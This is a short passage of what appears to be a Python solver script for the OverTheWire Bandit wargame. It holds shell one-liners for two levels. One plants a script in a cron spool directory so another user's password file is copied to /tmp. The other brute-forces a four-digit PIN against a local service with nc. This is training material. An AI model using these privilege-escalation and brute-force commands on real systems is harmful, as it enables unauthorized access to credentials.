...
def get_commands():
    return [
        ...
        '''F="/tmp/bandit24_pass_sealldev";G="/tmp/bandit$$.sh";echo "#!/bin/bash" > $G; echo "cat /etc/bandit_pass/bandit24 > $F" >> $G; chmod +x $G; cp $G /var/spool/bandit24/foo/; while [ ! -e $F ]; do sleep 0.1; done; cat $F''', # 23->24
        '''PASS=$(cat /tmp/bandit24_pass_sealldev); for i in {0000..9999}; do echo "$PASS $i"; done | nc localhost 30002 | grep -v "Wrong" | tail -2 | head -1 | sed "s/.* //"''', # 24->25
